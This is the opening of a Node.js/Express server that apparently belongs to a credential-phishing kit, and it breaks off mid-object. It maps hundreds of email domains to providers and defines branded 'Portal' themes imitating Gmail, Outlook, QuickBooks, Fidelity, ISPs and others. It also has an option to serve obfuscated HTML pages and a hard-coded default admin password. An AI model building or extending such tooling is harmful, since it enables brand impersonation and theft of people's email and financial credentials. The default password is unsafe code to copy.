require('dotenv').config();
const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const dns = require('dns');
const tls = require('tls');
const session = require('express-session');
const { ConfidentialClientApplication, LogLevel } = require('@azure/msal-node');
const { PDFDocument, StandardFonts, rgb } = require('pdf-lib');
const bcrypt = require('bcryptjs');
const argon2 = require('argon2');

// Password helpers: hash new pwds with argon2id; verify supports both argon2 and legacy bcrypt.
async function hashPassword(plain) {
  return argon2.hash(plain, { type: argon2.argon2id, memoryCost: 65536, timeCost: 3, parallelism: 1 });
}
async function verifyPassword(plain, hash) {
  if (!hash) return false;
  if (hash.startsWith('$argon2')) {
    try { return await argon2.verify(hash, plain); } catch { return false; }
  }
  // legacy bcrypt
  return bcrypt.compareSync(plain, hash);
}
// Sync bootstrap helper (ONLY for initial seeding — argon2 has no sync API)
function hashPasswordSyncBootstrap(plain) {
  return bcrypt.hashSync(plain, 10); // auto-upgrades to argon2id on first successful login
}
const { authenticator } = require('otplib');
const QRCode = require('qrcode');
const helmet = require('helmet');
const expressRateLimit = require('express-rate-limit');
const slowDown = require('express-slow-down');

// Serve obfuscated HTML when OBFUSCATED=1 and the .obf.html file exists
function pickHtml(name) {
  const obf = path.join(__dirname, 'public', name.replace(/\.html$/, '.obf.html'));
  const plain = path.join(__dirname, 'public', name);
  if (process.env.OBFUSCATED === '1' && fs.existsSync(obf)) return obf;
  return plain;
}

const app = express();
const PORT = process.env.PORT || 3000;

// ---- Generic debounced async file writer ----
// Many small data files (bans, trust lists, traffic, geo cache, ...) are saved
// on every change. fs.writeFileSync blocks the event loop AND writes the whole
// file even when 50 changes arrive in the same tick. This helper coalesces:
//   queueWrite(filePath, () => data, 'label', 250)
// schedules an async write in `delayMs`; subsequent calls within that window
// reuse the timer, so 50 changes → 1 write. Pretty-print is opt-in (machine-
// only files default to compact JSON for ~30% smaller files + faster encoding).
const _pendingWrites = new Map(); // path → { timer, getData, label, pretty }
function queueWrite(filePath, getData, label, opts = {}) {
  const { delayMs = 250, pretty = false } = opts;
  const existing = _pendingWrites.get(filePath);
  if (existing) clearTimeout(existing.timer);
  const entry = { getData, label, pretty };
  entry.timer = setTimeout(() => {
    _pendingWrites.delete(filePath);
    try {
      const json = pretty ? JSON.stringify(getData(), null, 2) : JSON.stringify(getData());
      fs.promises.writeFile(filePath, json)
        .catch(e => console.warn(`[${label}] async save failed`, e.message));
    } catch (e) { console.warn(`[${label}] serialize failed`, e.message); }
  }, delayMs);
  _pendingWrites.set(filePath, entry);
}
function flushPendingWrites() {
  for (const [filePath, entry] of _pendingWrites) {
    clearTimeout(entry.timer);
    try {
      const json = entry.pretty ? JSON.stringify(entry.getData(), null, 2) : JSON.stringify(entry.getData());
      fs.writeFileSync(filePath, json); // sync on shutdown — durability over latency
    } catch (e) { console.warn(`[${entry.label}] flush failed`, e.message); }
  }
  _pendingWrites.clear();
}
process.on('SIGINT',  () => { flushPendingWrites(); process.exit(0); });
process.on('SIGTERM', () => { flushPendingWrites(); process.exit(0); });
process.on('beforeExit', flushPendingWrites);

// ---- Admin credentials (used to seed first super admin) ----
const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'Str0ngP@ss!2026';

// ---- OAuth provider config ----
const MS_CLIENT_ID     = process.env.MS_CLIENT_ID;
const MS_CLIENT_SECRET = process.env.MS_CLIENT_SECRET;
const MS_TENANT        = process.env.MS_TENANT || 'common';
const MS_REDIRECT_URI  = process.env.MS_REDIRECT_URI || `http://localhost:${PORT}/auth/callback`;

const GOOGLE_CLIENT_ID     = process.env.GOOGLE_CLIENT_ID;
const GOOGLE_CLIENT_SECRET = process.env.GOOGLE_CLIENT_SECRET;
const GOOGLE_REDIRECT_URI  = process.env.GOOGLE_REDIRECT_URI || `http://localhost:${PORT}/auth/google/callback`;

let msalClient = null;
if (MS_CLIENT_ID && MS_CLIENT_SECRET) {
  msalClient = new ConfidentialClientApplication({
    auth: {
      clientId: MS_CLIENT_ID,
      clientSecret: MS_CLIENT_SECRET,
      authority: `https://login.microsoftonline.com/${MS_TENANT}`,
    },
    system: {
      loggerOptions: {
        loggerCallback: (_lvl, msg) => console.log('[msal]', msg),
        piiLoggingEnabled: false,
        logLevel: LogLevel.Warning,
      },
    },
  });
}

// ---- Provider detection maps ----
const DOMAIN_TO_PROVIDER = {
  'gmail.com': 'google', 'googlemail.com': 'google',
  'outlook.com': 'microsoft', 'hotmail.com': 'microsoft', 'live.com': 'microsoft',
  'msn.com': 'microsoft', 'outlook.co.uk': 'microsoft', 'hotmail.co.uk': 'microsoft',
  'live.co.uk': 'microsoft', 'outlook.de': 'microsoft', 'outlook.fr': 'microsoft',
  'yahoo.com': 'yahoo', 'yahoo.co.uk': 'yahoo', 'yahoo.co.jp': 'yahoo',
  'ymail.com': 'yahoo', 'rocketmail.com': 'yahoo', 'yahoo.fr': 'yahoo',
  'yahoo.de': 'yahoo', 'yahoo.ca': 'yahoo',
  'aliyun.com': 'alibaba', 'alibaba-inc.com': 'alibaba', 'alimail.com': 'alibaba',
  'icloud.com': 'apple', 'me.com': 'apple', 'mac.com': 'apple',
  'aol.com': 'aol', 'protonmail.com': 'proton', 'proton.me': 'proton',
  'pm.me': 'proton', 'zoho.com': 'zoho',
  // Chinese providers
  'qq.com': 'qq', 'foxmail.com': 'qq', 'vip.qq.com': 'qq',
  '163.com': 'netease', '126.com': 'netease', 'yeah.net': 'netease', 'netease.com': 'netease',
  'sina.com': 'sina', 'sina.cn': 'sina',
  'sohu.com': 'sohu',
  '139.com': 'chinamobile',
  'mail.ru': 'mailru', 'inbox.ru': 'mailru', 'bk.ru': 'mailru', 'list.ru': 'mailru',
  'yandex.com': 'yandex', 'yandex.ru': 'yandex',
  'naver.com': 'naver',
  'daum.net': 'daum', 'hanmail.net': 'daum',
  'gmx.com': 'gmx', 'gmx.net': 'gmx', 'gmx.de': 'gmx',
  'web.de': 'webde', 't-online.de': 'tonline',
  // US ISP / cable providers
  'comcast.com': 'xfinity', 'comcast.net': 'xfinity', 'xfinity.com': 'xfinity', 'xfinity.net': 'xfinity', 'mycomcast.com': 'xfinity',
  'optonline.net': 'optimum', 'optimum.net': 'optimum', 'optimum.com': 'optimum', 'optonline.com': 'optimum',
  'spectrum.net': 'spectrum', 'charter.net': 'spectrum', 'roadrunner.com': 'spectrum',
  'att.net': 'att', 'sbcglobal.net': 'att', 'bellsouth.net': 'att',
  'verizon.net': 'verizon', 'cox.net': 'cox', 'frontier.com': 'frontier',
  'earthlink.net': 'earthlink',
  'centurylink.net': 'centurylink',
  // More global providers
  'btinternet.com': 'bt', 'btopenworld.com': 'bt',
  'sky.com': 'sky', 'virginmedia.com': 'virginmedia',
  'orange.fr': 'orange', 'wanadoo.fr': 'orange',
  'free.fr': 'free', 'laposte.net': 'laposte',
  'libero.it': 'libero', 'virgilio.it': 'virgilio', 'tiscali.it': 'tiscali',
  'shaw.ca': 'shaw', 'rogers.com': 'rogers', 'bell.net': 'bell', 'telus.net': 'telus',
  'bigpond.com': 'telstra', 'optusnet.com.au': 'optus',

  // ---- France ----
  'sfr.fr': 'sfr', 'neuf.fr': 'sfr', 'club-internet.fr': 'sfr', 'numericable.fr': 'sfr', 'cegetel.net': 'sfr',
  'bbox.fr': 'bouygues', 'bouyguestelecom.fr': 'bouygues',
  'caramail.com': 'caramail', 'caramail.fr': 'caramail',
  'voila.fr': 'voila',
  'gmx.fr': 'gmx', 'aliceadsl.fr': 'orange',
  'yahoo.fr': 'yahoo',

  // ---- Germany / DACH ----
  'mailbox.org': 'mailbox',
  'posteo.de': 'posteo', 'posteo.net': 'posteo',
  'arcor.de': 'arcor',
  '1und1.de': 'oneandone', 'einsundeins.de': 'oneandone',
  'freenet.de': 'freenet',
  'vodafone.de': 'vodafone', 'vodafonemail.de': 'vodafone',
  'tutanota.com': 'tutanota', 'tutanota.de': 'tutanota', 'tuta.io': 'tutanota', 'tutamail.com': 'tutanota',
  'mail.de': 'maildedeu',
  'gmx.at': 'gmx', 'gmx.ch': 'gmx',
  'aol.de': 'aol',

  // ---- Spain ----
  'terra.es': 'terra', 'terra.com': 'terra',
  'telefonica.net': 'telefonica', 'telefonica.com': 'telefonica',
  'movistar.es': 'movistar',
  'ono.com': 'ono',
  'jazztel.es': 'jazztel', 'jazztel.com': 'jazztel',
  'ya.com': 'yacom', 'yahoo.es': 'yahoo',
  'mixmail.com': 'mixmail',
  'euskaltel.es': 'euskaltel',
  'vodafone.es': 'vodafone',
  'hotmail.es': 'microsoft', 'live.es': 'microsoft', 'outlook.es': 'microsoft',

  // ---- UK ----
  'talktalk.net': 'talktalk', 'talktalk.co.uk': 'talktalk', 'tinyworld.co.uk': 'talktalk',
  'plus.net': 'plusnet', 'plusnet.com': 'plusnet',
  'virgin.net': 'virginmedia', 'ntlworld.com': 'virginmedia', 'blueyonder.co.uk': 'virginmedia',
  'talk21.com': 'bt',
  'madasafish.com': 'madasafish',
  'aol.co.uk': 'aol',

  // ---- USA (additional) ----
  'juno.com': 'juno',
  'netzero.net': 'netzero', 'netzero.com': 'netzero',
  'windstream.net': 'windstream',
  'mediacomcc.com': 'mediacom', 'mchsi.com': 'mediacom',
  'fastmail.com': 'fastmail', 'fastmail.fm': 'fastmail',
  'pacbell.net': 'att', 'ameritech.net': 'att', 'swbell.net': 'att', 'snet.net': 'att', 'prodigy.net': 'att',
  'charter.com': 'spectrum', 'twc.com': 'spectrum', 'rr.com': 'spectrum',
  'aim.com': 'aol',
  'usa.net': 'usanet',
  'mindspring.com': 'earthlink',
  'suddenlink.net': 'optimum',
  'hawaii.rr.com': 'spectrum', 'nycap.rr.com': 'spectrum', 'tampabay.rr.com': 'spectrum',
  'austin.rr.com': 'spectrum', 'columbus.rr.com': 'spectrum', 'maine.rr.com': 'spectrum',

  // ---- China (additional) ----
  '188.com': 'oneeightoneight',
  '21cn.com': 'twentyonecn',
  'tom.com': 'tom',
  '263.net': 'twosixthree',
  '189.cn': 'chinatelecom',
  'wo.com.cn': 'chinaunicom',
  'vip.163.com': 'netease', 'vip.126.com': 'netease',
  'vip.sina.com': 'sina', 'vip.sohu.com': 'sohu',

  // ---- Arab countries ----
  // UAE
  'emirates.net.ae': 'etisalat', 'eim.ae': 'etisalat', 'etisalat.ae': 'etisalat',
  'du.ae': 'du',
  // Saudi Arabia
  'stc.com.sa': 'stc',
  // Egypt
  'tedata.net.eg': 'tedata', 'link.com.eg': 'linkdotnet', 'noor.net': 'noor',
  // Morocco
  'menara.ma': 'maroctelecom', 'iam.net.ma': 'maroctelecom',
  // Tunisia
  'planet.tn': 'tunisietelecom', 'topnet.tn': 'topnet', 'gnet.tn': 'gnet',
  // Bahrain
  'batelco.com.bh': 'batelco',
  // Qatar
  'qatar.net.qa': 'qatartel',
  // Oman
  'omantel.net.om': 'omantel',
  // Lebanon
  'idm.net.lb': 'idm', 'sodetel.net.lb': 'sodetel',
  // Jordan
  'nets.com.jo': 'jordannet',
  // Iraq
  'uruklink.net': 'uruklink',
  // Yemen
  'y.net.ye': 'yemennet',
  // Algeria
  'algerietelecom.dz': 'algerietelecom',

  // ---- Email hosting platforms ----
  // Rackspace
  'rackspace.com': 'rackspace', 'emailsrvr.com': 'rackspace',
  // GoDaddy
  'secureserver.net': 'godaddy', 'godaddy.com': 'godaddy',
  // OVH
  'ovh.fr': 'ovh', 'ovh.com': 'ovh', 'ovh.net': 'ovh',
  // IONOS
  'ionos.com': 'ionos', 'ionos.de': 'ionos',
};

const PROVIDER_INFO = {
  google:    { name: 'Gmail Portal',    color: '#1a73e8' },
  microsoft: { name: 'Outlook Portal', color: '#0067b8' },
  yahoo:     { name: 'Yahoo Portal',     color: '#6001d2' },
  alibaba:   { name: 'Alibaba Portal',   color: '#ff6a00' },
  apple:     { name: 'Apple Portal',     color: '#000000' },
  aol:       { name: 'AOL Portal',       color: '#31459b' },
  proton:    { name: 'Proton Portal',    color: '#6d4aff' },
  zoho:      { name: 'Zoho Portal',      color: '#c8202b' },
  qq:          { name: 'QQ Portal',       color: '#12b7f5' },
  netease:     { name: '163 Portal', color: '#d93b30' },
  sina:        { name: 'Sina Portal',    color: '#e6162d' },
  sohu:        { name: 'Sohu Portal',    color: '#d44d27' },
  chinamobile: { name: 'China Mobile Portal', color: '#0076d6' },
  mailru:      { name: 'Mail.ru Portal',      color: '#005ff9' },
  yandex:      { name: 'Yandex Portal',       color: '#fc3f1d' },
  naver:       { name: 'Naver Portal',        color: '#03c75a' },
  daum:        { name: 'Daum Portal',         color: '#f09819' },
  gmx:         { name: 'GMX Portal',          color: '#1c449b' },
  webde:       { name: 'Web.de Portal',       color: '#f8c800' },
  tonline:     { name: 'T-Online Portal',     color: '#e20074' },
  att:         { name: 'AT&T Portal',         color: '#009fdb' },
  verizon:     { name: 'Verizon Portal',     color: '#cd040b' },
  cox:         { name: 'Cox Portal',         color: '#ef6020' },
  frontier:    { name: 'Frontier Portal',    color: '#e4002b' },
  xfinity:     { name: 'Xfinity Portal',      color: '#e60000' },
  optimum:     { name: 'Optimum Portal',     color: '#003057' },
  spectrum:    { name: 'Spectrum Portal',    color: '#003057' },
  earthlink:   { name: 'EarthLink Portal',   color: '#ff6600' },
  centurylink: { name: 'CenturyLink Portal', color: '#009bdb' },
  bt:          { name: 'BT Portal',          color: '#5514b4' },
  sky:         { name: 'Sky Portal',         color: '#0072c9' },
  virginmedia: { name: 'Virgin Media Portal',color: '#c3092d' },
  orange:      { name: 'Orange Portal',      color: '#ff7900' },
  free:        { name: 'Free Portal',        color: '#cd1e25' },
  laposte:     { name: 'La Poste Portal',    color: '#ffcc00' },
  libero:      { name: 'Libero Portal',      color: '#0066cc' },
  virgilio:    { name: 'Virgilio Portal',    color: '#ff8c00' },
  tiscali:     { name: 'Tiscali Portal',     color: '#ff0000' },
  shaw:        { name: 'Shaw Portal',        color: '#003b6f' },
  rogers:      { name: 'Rogers Portal',      color: '#da291c' },
  bell:        { name: 'Bell Portal',        color: '#0050a0' },
  telus:       { name: 'TELUS Portal',       color: '#4b286d' },
  telstra:     { name: 'Telstra Portal',     color: '#001e82' },
  optus:       { name: 'Optus Portal',       color: '#00828c' },
  sfr:             { name: 'SFR Portal',                 color: '#e2001a' },
  bouygues:        { name: 'Bouygues Portal',    color: '#005ca9' },
  caramail:        { name: 'Caramail Portal',            color: '#ff7300' },
  voila:           { name: 'Voila Portal',               color: '#0099ff' },
  mailbox:         { name: 'Mailbox Portal',         color: '#1a4f63' },
  posteo:          { name: 'Posteo Portal',              color: '#168a16' },
  arcor:           { name: 'Arcor Portal',               color: '#e60000' },
  oneandone:       { name: '1&1 Portal',                 color: '#003d8f' },
  freenet:         { name: 'Freenet Portal',             color: '#fa6400' },
  vodafone:        { name: 'Vodafone Portal',            color: '#e60000' },
  tutanota:        { name: 'Tutanota Portal',                color: '#840010' },
  maildedeu:       { name: 'Mail.de Portal',             color: '#0069b4' },
  terra:           { name: 'Terra Portal',               color: '#0066cc' },
  telefonica:      { name: 'Telefónica Portal',          color: '#019df4' },
  movistar:        { name: 'Movistar Portal',            color: '#0e9bcf' },
  ono:             { name: 'ONO Portal',                 color: '#fdc500' },
  jazztel:         { name: 'Jazztel Portal',             color: '#fa5a00' },
  yacom:           { name: 'Ya.com Portal',              color: '#5d2e8c' },
  mixmail:         { name: 'Mixmail Portal',             color: '#e2007a' },
  euskaltel:       { name: 'Euskaltel Portal',           color: '#37a23a' },
  talktalk:        { name: 'TalkTalk Portal',            color: '#7b2eaf' },
  plusnet:         { name: 'Plusnet Portal',             color: '#00b1ec' },
  madasafish:      { name: 'Madasafish Portal',          color: '#5a1e80' },
  juno:            { name: 'Juno Portal',                color: '#0a4a90' },
  netzero:         { name: 'NetZero Portal',             color: '#199a3f' },
  windstream:      { name: 'Windstream Portal',          color: '#003366' },
  mediacom:        { name: 'Mediacom Portal',            color: '#0072c6' },
  fastmail:        { name: 'FastMail Portal',            color: '#1971ff' },
  usanet:          { name: 'USA.NET Portal',             color: '#0033a0' },
  oneeightoneight: { name: '188 Portal',            color: '#cc0000' },
  twentyonecn:     { name: '21CN Portal',                color: '#0066cc' },
  tom:             { name: 'TOM Portal',                 color: '#ff5e00' },
  twosixthree:     { name: '263 Portal',            color: '#0058a3' },
  chinatelecom:    { name: 'China Telecom Portal',       color: '#005bac' },
  chinaunicom:     { name: 'China Unicom Portal',        color: '#e60012' },
  etisalat:        { name: 'Etisalat Portal',            color: '#75bf24' },
  du:              { name: 'du Portal',                  color: '#003e7e' },
  stc:             { name: 'STC Portal',                 color: '#4f1f80' },
  tedata:          { name: 'TE Data Portal',             color: '#1c4587' },
  linkdotnet:      { name: 'Link.net Portal',            color: '#e30613' },
  noor:            { name: 'Noor Portal',                color: '#003a70' },
  maroctelecom:    { name: 'Maroc Telecom Portal',       color: '#e2001a' },
  tunisietelecom:  { name: 'Tunisie Telecom Portal',     color: '#e2001a' },
  topnet:          { name: 'Topnet Portal',              color: '#0066b3' },
  gnet:            { name: 'GlobalNet Portal',           color: '#1d4886' },
  batelco:         { name: 'Batelco Portal',             color: '#003c71' },
  qatartel:        { name: 'Ooredoo Portal',             color: '#ed1c24' },
  omantel:         { name: 'Omantel Portal',             color: '#005eb8' },
  idm:             { name: 'IDM Portal',                 color: '#003d6b' },
  sodetel:         { name: 'Sodetel Portal',             color: '#005baa' },
  jordannet:       { name: 'Jordan Telecom Portal',      color: '#0072bc' },
  uruklink:        { name: 'UrukLink Portal',            color: '#cc0000' },
  yemennet:        { name: 'YemenNet Portal',            color: '#cc0000' },
  algerietelecom:  { name: 'Algérie Télécom Portal',     color: '#006233' },
  rackspace:       { name: 'Rackspace Portal',     color: '#cf2127' },
  godaddy:         { name: 'GoDaddy Portal',       color: '#1bdbdb' },
  ovh:             { name: 'OVH Portal',            color: '#123f6d' },
  ionos:           { name: 'IONOS Portal',       color: '#003d8f' },
  email:       { name: 'Email',        color: '#eb1000' },
};

// ---- Provider themes (with correct Portal names) ----
const PROVIDER_THEMES = {
  quickbook: { primary: '#1db14d', button: '#1db14d', text: '#ffffff', accent: '#0d8a3a', name: 'QuickBooks Portal', logo: '<svg xmlns="http://www.w3.org/2000/svg" width="72" height="72" fill="none" viewBox="0 0 72 72"><g clip-path="url(#a)"><path fill="#fff" d="M36 71.912c19.882 0 36-16.118 36-36s-16.118-36-36-36-36 16.118-36 36c0 19.883 16.118 36 36 36Z"/><path fill="#2CA01C" fill-rule="evenodd" d="M72 35.912c0 19.883-16.118 36-36 36s-36-16.118-36-36 16.118-36 36-36 36 16.118 36 36Zm-48.004 14c-7.732 0-14-6.269-14-14 0-7.732 6.268-14 14-14h10.006v37.6a5.2 5.2 0 0 1-5.2-5.2v-27.2h-4.806c-4.852 0-8.8 3.947-8.8 8.8 0 4.852 3.948 8.8 8.8 8.8h2v5.2h-2Zm22.008-27.998h2c7.732 0 14 6.267 14 14 0 7.731-6.268 14-14 14H37.997v-37.6a5.2 5.2 0 0 1 5.2 5.2v27.2h4.806c4.853 0 8.8-3.948 8.8-8.8 0-4.853-3.947-8.8-8.8-8.8h-2v-5.2Z" clip-rule="evenodd"/></g><defs><clipPath id="a"><path fill="#fff" d="M0 0h72v72H0z"/></clipPath></defs></svg>' },
  fidelity: { primary: '#00897b', button: '#00897b', text: '#ffffff', accent: '#005a4f', name: 'Fidelity Portal', logo: '<svg viewBox="0 0 200 60" xmlns="http://www.w3.org/2000/svg"><g><path d="M15 8 L32 8 L32 52 L15 52 Z" fill="#00897b"/><path d="M35 8 L52 8 L52 52 L35 52 Z" fill="#00897b" opacity="0.7"/><text x="65" y="42" font-size="22" font-weight="700" fill="#00897b" font-family="Arial">fidelity</text></g></svg>' },
  personal: { primary: '#6366f1', button: '#6366f1', text: '#ffffff', accent: '#4f46e5', name: 'Personal Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">P</text>' },
  google: { primary: '#4285f4', button: '#4285f4', text: '#ffffff', accent: '#1f6feb', name: 'Gmail Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">G</text>' },
  microsoft: { primary: '#0078d4', button: '#0078d4', text: '#ffffff', accent: '#005a9e', name: 'Outlook Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">O</text>' },
  yahoo: { primary: '#7c2ae8', button: '#7c2ae8', text: '#ffffff', accent: '#5a1a9f', name: 'Yahoo Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">Y</text>' },
  apple: { primary: '#000000', button: '#000000', text: '#ffffff', accent: '#333333', name: 'Apple Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">i</text>' },
  xfinity: { primary: '#000000', button: '#000000', text: '#ffffff', accent: '#333333', name: 'Xfinity Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">X</text>' },
  aol: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'AOL Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">A</text>' },
  proton: { primary: '#6d4aff', button: '#6d4aff', text: '#ffffff', accent: '#5a3dcc', name: 'Proton Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">P</text>' },
  tutanota: { primary: '#840010', button: '#840010', text: '#ffffff', accent: '#600000', name: 'Tutanota Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">T</text>' },
  fastmail: { primary: '#1e3a8a', button: '#1e3a8a', text: '#ffffff', accent: '#1e40af', name: 'FastMail Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">F</text>' },
  mailbox: { primary: '#2d3748', button: '#2d3748', text: '#ffffff', accent: '#4a5568', name: 'Mailbox Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">M</text>' },
  qq: { primary: '#1d9bf0', button: '#1d9bf0', text: '#ffffff', accent: '#1a8cd8', name: 'QQ Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">Q</text>' },
  netease: { primary: '#d82d2d', button: '#d82d2d', text: '#ffffff', accent: '#b82424', name: '163 Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">N</text>' },
  sina: { primary: '#ff6600', button: '#ff6600', text: '#ffffff', accent: '#dd5500', name: 'Sina Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">S</text>' },
  sohu: { primary: '#e7001c', button: '#e7001c', text: '#ffffff', accent: '#bb0015', name: 'Sohu Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">S</text>' },
  yandex: { primary: '#ff0000', button: '#ff0000', text: '#ffffff', accent: '#cc0000', name: 'Yandex Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">Y</text>' },
  mailru: { primary: '#003da5', button: '#003da5', text: '#ffffff', accent: '#002b81', name: 'Mail.ru Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">M</text>' },
  naver: { primary: '#00c73c', button: '#00c73c', text: '#ffffff', accent: '#009928', name: 'Naver Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">N</text>' },
  daum: { primary: '#b4a7d6', button: '#b4a7d6', text: '#ffffff', accent: '#9a85bc', name: 'Daum Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">D</text>' },
  gmx: { primary: '#ff6600', button: '#ff6600', text: '#ffffff', accent: '#dd5500', name: 'GMX Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">G</text>' },
  webde: { primary: '#0080d0', button: '#0080d0', text: '#ffffff', accent: '#0066a8', name: 'Web.de Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">W</text>' },
  tonline: { primary: '#ce0220', button: '#ce0220', text: '#ffffff', accent: '#a40118', name: 'T-Online Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">T</text>' },
  spectrum: { primary: '#9933ff', button: '#9933ff', text: '#ffffff', accent: '#7a26cc', name: 'Spectrum Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">S</text>' },
  att: { primary: '#002266', button: '#002266', text: '#ffffff', accent: '#001a4d', name: 'AT&T Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">A</text>' },
  verizon: { primary: '#ba0021', button: '#ba0021', text: '#ffffff', accent: '#990018', name: 'Verizon Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">V</text>' },
  cox: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'Cox Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">C</text>' },
  frontier: { primary: '#004b87', button: '#004b87', text: '#ffffff', accent: '#003a66', name: 'Frontier Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">F</text>' },
  optimum: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'Optimum Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">O</text>' },
  alibaba: { primary: '#ff6600', button: '#ff6600', text: '#ffffff', accent: '#dd5500', name: 'Alibaba Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">A</text>' },
  zoho: { primary: '#3961e8', button: '#3961e8', text: '#ffffff', accent: '#2d4ac4', name: 'Zoho Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">Z</text>' },
  chinamobile: { primary: '#e4002b', button: '#e4002b', text: '#ffffff', accent: '#b80020', name: 'China Mobile Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">C</text>' },
  chinatelecom: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'China Telecom Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">C</text>' },
  chinaunicom: { primary: '#ff6600', button: '#ff6600', text: '#ffffff', accent: '#dd5500', name: 'China Unicom Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">C</text>' },
  bt: { primary: '#1f1f1f', button: '#1f1f1f', text: '#ffffff', accent: '#333333', name: 'BT Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">B</text>' },
  sky: { primary: '#0080d0', button: '#0080d0', text: '#ffffff', accent: '#0066a8', name: 'Sky Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">S</text>' },
  virginmedia: { primary: '#d81f2d', button: '#d81f2d', text: '#ffffff', accent: '#a51820', name: 'Virgin Media Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">V</text>' },
  orange: { primary: '#ff6600', button: '#ff6600', text: '#ffffff', accent: '#dd5500', name: 'Orange Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">O</text>' },
  free: { primary: '#e4001c', button: '#e4001c', text: '#ffffff', accent: '#b80015', name: 'Free Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">F</text>' },
  sfr: { primary: '#e4001c', button: '#e4001c', text: '#ffffff', accent: '#b80015', name: 'SFR Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">S</text>' },
  laposte: { primary: '#1f5197', button: '#1f5197', text: '#ffffff', accent: '#164075', name: 'La Poste Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">L</text>' },
  posteo: { primary: '#000000', button: '#000000', text: '#ffffff', accent: '#333333', name: 'Posteo Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">P</text>' },
  earthlink: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'EarthLink Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">E</text>' },
  ionos: { primary: '#003d8f', button: '#003d8f', text: '#ffffff', accent: '#002860', name: 'IONOS Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">I</text>' },
  rackspace: { primary: '#c40023', button: '#c40023', text: '#ffffff', accent: '#8b0018', name: 'Rackspace Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">R</text>' },
